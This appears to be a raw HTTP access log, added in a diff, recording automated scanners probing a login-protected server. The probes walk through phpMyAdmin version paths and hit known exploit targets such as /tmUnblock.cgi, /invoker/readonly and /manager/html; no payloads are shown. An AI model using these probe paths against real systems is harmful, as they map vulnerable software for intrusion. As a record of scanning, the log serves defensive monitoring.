+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:38 +0000] "GET /phpMyAdmin-2.6.3-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:47 +0000] "GET /phpMyAdmin-2.6.3/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:48 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:49 +0000] "GET /phpMyAdmin-2.6.3-pl1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:50 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:51 +0000] "GET /phpMyAdmin-2.6.4-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:53 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:54 +0000] "GET /phpMyAdmin-2.6.4-pl1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:55 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:56 +0000] "GET /phpMyAdmin-2.6.4-pl2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:44:57 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:01 +0000] "GET /phpMyAdmin-2.6.4-pl3/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:02 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:03 +0000] "GET /phpMyAdmin-2.6.4-pl4/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:07 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:09 +0000] "GET /phpMyAdmin-2.6.4/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:13 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:15 +0000] "GET /phpMyAdmin-2.7.0-beta1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:15 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:16 +0000] "GET /phpMyAdmin-2.7.0-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:17 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:19 +0000] "GET /phpMyAdmin-2.7.0-pl1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:19 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:20 +0000] "GET /phpMyAdmin-2.7.0-pl2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:22 +0000] "GET /phpMyAdmin-2.7.0/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:26 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:30 +0000] "GET /phpMyAdmin-2.8.0-beta1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:32 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:36 +0000] "GET /phpMyAdmin-2.8.0-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:37 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:37 +0000] "GET /phpMyAdmin-2.8.0-rc2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:45:39 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:02:50:37 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:02:50:37 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:03:12:49 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:03:12:49 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:03:35:02 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:03:35:02 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:03:57:14 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:03:57:14 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:04:19:26 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:04:19:26 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:04:41:38 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:04:41:38 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:05:03:51 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:05:03:51 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:05:26:03 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:05:26:03 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:05:48:15 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:05:48:15 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:06:10:28 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:06:10:28 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:06:32:41 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:06:32:41 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+redirecting to login
+::ffff:77.247.109.70 - - [11/Apr/2019:06:52:19 +0000] "HEAD /robots.txt HTTP/1.0" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:06:54:53 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:06:54:53 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+redirecting to login
+::ffff:101.1.27.161 - - [11/Apr/2019:07:05:12 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:07:17:05 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:07:17:05 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:07:39:18 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:07:39:18 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:91.206.14.216 - - [11/Apr/2019:07:55:07 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:91.206.14.216 - - [11/Apr/2019:07:55:08 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:08:01:29 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:08:01:29 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:08:23:42 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:08:23:42 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:91.206.14.216 - - [11/Apr/2019:08:43:09 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:91.206.14.216 - - [11/Apr/2019:08:43:10 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:08:45:55 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:08:45:55 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:139.162.79.87 - - [11/Apr/2019:08:49:00 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:09:08:07 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:09:08:07 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:52.205.117.191 - - [11/Apr/2019:09:08:27 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 zgrab/0.x"
+::ffff:52.205.117.191 - - [11/Apr/2019:09:08:27 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 zgrab/0.x"
+redirecting to login
+::ffff:188.166.122.38 - - [11/Apr/2019:09:14:41 +0000] "POST /tmUnblock.cgi HTTP/1.1" 302 28 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64"
+::ffff:188.166.122.38 - - [11/Apr/2019:09:14:41 +0000] "GET /login HTTP/1.1" 200 7268 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64"
+redirecting to login
+::ffff:188.166.122.38 - - [11/Apr/2019:09:14:41 +0000] "GET /tmUnblock.cgi HTTP/1.1" 302 28 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64"
+::ffff:188.166.122.38 - - [11/Apr/2019:09:14:42 +0000] "GET /login HTTP/1.1" 200 7268 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64"
+welcome: Unable to identify user...redirecting to login
+::ffff:208.113.196.8 - - [11/Apr/2019:09:16:15 +0000] "HEAD / HTTP/1.0" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:09:30:20 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:09:30:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:69.163.152.111 - - [11/Apr/2019:09:33:22 +0000] "HEAD / HTTP/1.0" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:09:52:32 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:09:52:32 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:10:14:44 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:10:14:44 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:10:36:56 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:10:36:56 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:10:59:09 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:10:59:09 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:11:21:20 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:11:21:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:11:43:32 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:11:43:32 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:12:05:43 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:12:05:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:12:27:55 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:12:27:55 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:12:50:07 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:12:50:07 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:13:12:19 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:13:12:19 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:52.82.13.171 - - [11/Apr/2019:13:31:35 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 zgrab/0.x"
+::ffff:52.82.13.171 - - [11/Apr/2019:13:31:35 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 zgrab/0.x"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:13:34:31 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:13:34:31 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:13:56:43 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:13:56:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:14:18:56 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:14:18:56 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+redirecting to login
+::ffff:106.12.85.134 - - [11/Apr/2019:14:31:07 +0000] "POST /invoker/readonly HTTP/1.1" 302 28 "-" "-"
+redirecting to login
+::ffff:222.186.15.23 - - [11/Apr/2019:14:34:45 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:14:41:08 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:14:41:08 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:15:03:20 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:15:03:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:15:25:31 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:15:25:31 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [11/Apr/2019:15:46:05 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [11/Apr/2019:15:46:05 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [11/Apr/2019:15:46:07 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [11/Apr/2019:15:46:07 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:15:47:43 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:15:47:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:16:09:46 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:16:09:46 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:209.17.96.74 - - [11/Apr/2019:16:25:32 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+welcome: Unable to identify user...redirecting to login
+::ffff:61.219.11.153 - - [11/Apr/2019:17:29:16 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+redirecting to login
+::ffff:120.79.30.191 - - [11/Apr/2019:18:23:18 +0000] "GET /TP/public/index.php HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+redirecting to login
+::ffff:120.79.30.191 - - [11/Apr/2019:18:23:19 +0000] "POST /users?page=&size=5 HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::ffff:120.79.30.191 - - [11/Apr/2019:18:23:19 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/users?page=&size=5" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+welcome: Unable to identify user...redirecting to login
+::ffff:120.79.30.191 - - [11/Apr/2019:18:23:20 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::ffff:120.79.30.191 - - [11/Apr/2019:18:23:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+welcome: Unable to identify user...redirecting to login
+::ffff:196.52.43.128 - - [11/Apr/2019:21:44:32 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:184.105.139.69 - - [12/Apr/2019:00:30:17 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:80.82.77.33 - - [12/Apr/2019:00:44:36 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+::ffff:80.82.77.33 - - [12/Apr/2019:00:44:36 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:18.215.254.145 - - [12/Apr/2019:05:32:34 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/52.0.3000.55 Safari/537.32"
+::ffff:18.215.254.145 - - [12/Apr/2019:05:32:34 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/52.0.3000.55 Safari/537.32"
